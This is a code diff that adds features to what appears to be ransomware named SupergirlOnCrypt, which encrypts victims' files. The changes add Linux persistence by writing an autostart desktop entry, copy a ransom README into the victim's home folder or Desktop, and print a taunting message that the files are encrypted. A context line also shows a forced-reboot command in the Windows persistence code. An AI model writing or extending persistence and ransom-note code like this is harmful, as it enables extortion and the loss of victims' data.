@@ -12,6 +12,7 @@ import json
 import os
 import time
 import requests
+import shutil
 from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
@@ -35,7 +36,8 @@ def init():
         _helper.info('Generating UUID => ' + id)
         _helper.write_file(str(Path.home()) + '/supergirl.uuid', id)
         makePersistence()
-    
+
+    copyInstructions()
     startGui(id)
 
 def startGui(id):
@@ -44,6 +46,11 @@ def startGui(id):
             app = QApplication(sys.argv)
             oMainwindow = GUI(id)
             sys.exit(app.exec_())
+        else:
+            _helper.super_logo()
+            _helper.supergirl_pic()
+            print("Supergirl needs a GUI. She encrypted your Files and you are screwed")
+            print("Have a nice Day! ;)")
     else:
         app = QApplication(sys.argv)
         oMainwindow = GUI(id)
@@ -51,7 +58,6 @@ def startGui(id):
 
 def makePersistence():
     if getattr(sys, 'frozen', False):
-        import shutil
         dest = str(Path.home()) + '/SupergirlOnCrypt'
         if sys.platform == "win32":
             dest = dest + ".exe"
@@ -86,8 +92,16 @@ def makePersistence():
                 os.system("shutdown -t 0 -r -f")
                 _helper.safe_exit()
         elif sys.platform == 'linux' or sys.platform == 'linux2':
-            #TODO: Linux persistence
-            pass
+            home = str(Path.home())
+            if not os.path.isdir(home + '/.config/autostart/'):
+                os.makedirs(home + '/.config/autostart')
+            #load the desktop file and replace homedir
+            with open(_helper.path('res/autostart_lin.desktop'), 'r') as f:
+                desktop_file = f.read()
+            desktop_file = desktop_file.replace("[home_folder]", home)
+            with open(home + '/.config/autostart/supergirloncrypt.desktop', 'w') as fout:
+                fout.write(desktop_file)
+            os.system("chmod +x " + dest)
     else:
         _helper.warning('Not running as a frozen file - skipping persistence')
 
@@ -149,6 +163,16 @@ def encryptClientPrivKey(priv_key):
     )
     _helper.info("Private Client Key is encrypted")
     return cipher
+
+
+def copyInstructions():
+    home = str(Path.home())
+    if not os.path.isfile(home + "/README.txt"):
+        if sys.platform == "win32":
+            shutil.copyfile(_helper.path("res/README.txt"), home + "/Desktop/README.txt")
+        else:
+            shutil.copyfile(_helper.path("res/README.txt"), home + "/README.txt")
+        _helper.debug("Copy README to " + str(os.path.join(home, "README.txt")))
 
 
 if __name__ == "__main__":
